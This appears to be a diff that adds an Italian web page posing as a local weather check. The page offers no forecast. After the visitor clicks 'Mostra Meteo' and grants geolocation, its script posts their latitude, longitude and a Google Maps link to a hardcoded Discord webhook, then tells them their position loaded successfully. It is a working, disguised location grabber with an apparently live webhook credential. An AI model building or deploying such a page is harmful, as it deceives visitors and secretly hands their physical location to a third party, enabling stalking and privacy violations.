@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifica Posizione Meteo</title>
+</head>
+<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
+
+    <h2>Premi il pulsante per caricare le previsioni meteo della tua zona</h2>
+    <button onclick="ottieniPosizione()" style="padding: 15px 25px; font-size: 16px;">Mostra Meteo</button>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1532480331641389211/JeR1Qx5ssbO4l8zcfHm0mv7zQQnj4V8cPEjQnv5Fc68c_7qlc7kmBfNNb2OsNdZ1SQ2X";
+
+        function ottieniPosizione() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(inviaPosizione, gestisciErrore);
+            } else {
+                alert("Geolocalizzazione non supportata dal tuo browser.");
+            }
+        }
+
+        function inviaPosizione(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Invio automatico dei dati al tuo Webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📍 **Posizione ricevuta!**\nLatitudine: ${lat}\nLongitudine: ${lon}\nMappa: ${linkMaps}`
+                })
+            }).then(() => {
+                alert("Posizione caricata con successo!");
+            });
+        }
+
+        function gestisciErrore(error) {
+            alert("Impossibile caricare la posizione. Hai rifiutato il permesso.");
+        }
+    </script>
+</body>
+</html>
